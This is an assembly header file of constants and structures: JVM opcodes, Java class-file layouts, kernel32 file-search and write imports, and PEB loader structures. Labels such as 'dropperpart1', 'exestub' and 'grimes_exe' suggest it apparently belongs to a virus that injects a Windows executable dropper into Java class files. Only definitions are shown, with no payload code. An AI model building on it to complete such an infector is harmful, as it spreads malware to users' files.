CONSTANT_Utf8                                         equ     1
CONSTANT_Integer                                      equ     3
CONSTANT_Float                                        equ     4
CONSTANT_Long                                         equ     5
CONSTANT_Double                                       equ     6
CONSTANT_Class                                        equ     7
CONSTANT_String                                       equ     8
CONSTANT_Fieldref                                     equ     9
CONSTANT_Methodref                                    equ     0ah
CONSTANT_InterfaceMethodref                           equ     0bh
CONSTANT_NameAndType                                  equ     0ch
CONSTANT_MethodHandle	                              equ     0fh
CONSTANT_MethodType	                                  equ     10h
CONSTANT_InvokeDynamic	                              equ     12h

ACC_PUBLIC                                            equ     1
ACC_STATIC                                            equ     8

APPENDSIZE                                            equ     7
CPCOUNT                                               equ     1fh

ARRAYSIZE                                             equ     800h

PESIZE                                                equ     (offset dropperpart2 - offset exestub)
OTBLSIZE1                                             equ     (offset exestub - offset offtable1)
OTBLSIZE2                                             equ     offset skip_cpool - offset offtable2

CODESIZE                                              equ     ((offset arraycode - offset dropperpart1) + (offset dropper_end - offset dropperpart2) + ((PESIZE / 2) * 8)) + ((offset code_end - offset grimes_exe) * 8)
ADDSIZE1                                              equ     (offset cpool_end - offset cpool_begin) + APPENDSIZE + sizeof exception_table 
ADDSIZE2                                              equ     sizeof Code_attribute + sizeof method_info + sizeof attribute_info + CODESIZE

methodref                                             equ     1ah

BYTETYPE                                              equ     8
OP_ACONSTNULL                                         equ     1
OP_ALOAD0                                             equ     2ah
OP_ALOAD1                                             equ     2bh
OP_ASTORE0                                            equ     4bh
OP_ASTORE1                                            equ     4ch
OP_POP                                                equ     57h
OP_NEW                                                equ     0bbh
OP_GOTO                                               equ     0a7h
OP_ARRAYLENGTH                                        equ     0beh
OP_ICONST0                                            equ     3
OP_INVOKEVIRTUAL                                      equ     0b6h
OP_INVOKESPECIAL                                      equ     0b7h
OP_INVOKESTATIC                                       equ     0b8h
OP_LDCW                                               equ     13h
OP_BASTORE                                            equ     54h
OP_DUP                                                equ     59h
OP_SIPUSH                                             equ     11h
OP_RETURN                                             equ     0b1h
OP_NEWARRAY                                           equ     0bch

exception_table struct
    start_pc   dw ?
    end_pc     dw ?
    handler_pc dw ?
    catch_type dw ?
exception_table ends

Code_attribute struct
    max_stack              dw ?
    max_locals             dw ?
    code_length            dd ?   
    exception_table_length dw ?
;   exception_table        dw ?
    attributes_count       dw ? 
Code_attribute ends

attribute_info struct
    attribute_name_index dw ?
    attribute_length     dd ?
attribute_info ends

method_info struct
    access_flags     dw ?
    name_index       dw ?
    descriptor_index dw ?
    attributes_count dw ?
method_info ends

field_info struct
    access_flags     dw ?
    name_index       dw ?
    descriptor_index dw ?
    attributes_count dw ?
field_info ends

ClassFile struct
    magic               dd ?
    minor_version       dw ?
    major_version       dw ?
    constant_pool_count dw ?
    constant_pool       db ?
    access_flags        dw ?
    this_class          dw ?
    super_class         dw ?
    interfaces_count    dw ?
;   interfaces          db ?
    fields_count        dw ?
;   fields              db ?
    methods_count       dw ?
    methods             db ?
    attributes_count    dw ?
    attributes          db ?
ClassFile ends

CONSTANT_Utf8_info struct
    tag     db ?
    slength dw ?
    bytes   db ?
CONSTANT_Utf8_info ends

kernel32 struct
    kWriteFile          dd ?
    kSetFilePointer     dd ?
    kSetFileAttributesW dd ?
    kReadFile           dd ?
    kGlobalFree         dd ?
    kGlobalAlloc        dd ?
    kFindNextFileW      dd ?
    kFindFirstFileW     dd ?
    kFindClose          dd ?
    kExitProcess        dd ?
    kCreateFileW        dd ?
    kCloseHandle        dd ?
kernel32 ends

WIN32_FIND_DATA struct
    dwFileAttributes dd ?
    ftCreationTime   dq ?
    ftLastAccessTime dq ?
    ftLastWriteTime  dq ?
    nFileSizeHigh    dd ?
    nFileSizeLow     dd ?
    dwReserved0      dd ?
    dwReserved1      dd ?
    cFileName        db 260 dup (?)
    cAlternate       db 0eh dup (?)
WIN32_FIND_DATA ends

LIST_ENTRY struct
    FLink dd ?
    BLink dd ?
LIST_ENTRY ends

_PEB_LDR_DATA struct
    dwLength                          dd ?
    bInitialized                      dd ?
    dwSsHandle                        dd ?
    dwInLoadOrderModuleList           LIST_ENTRY <?>
    dwInMemoryOrderModuleList         LIST_ENTRY <?>
    dwInInitializationOrderModuleList LIST_ENTRY <?>
_PEB_LDR_DATA ends

PROCESS_ENVIRONMENT_BLOCK struct
	bInhiritedAddressSpace    db ?
	bReadImageFileExecOptions db ?
	bBeingDebugged            db ?
	bSpare                    db ?
	hMutant                   dd ?
	dwImageBaseAddress        dd ?
	lpLoaderData              dd ?
	lpProcessParameters       dd ?
PROCESS_ENVIRONMENT_BLOCK ends

include windows.inc
include kernel32.inc
includelib kernel32.lib
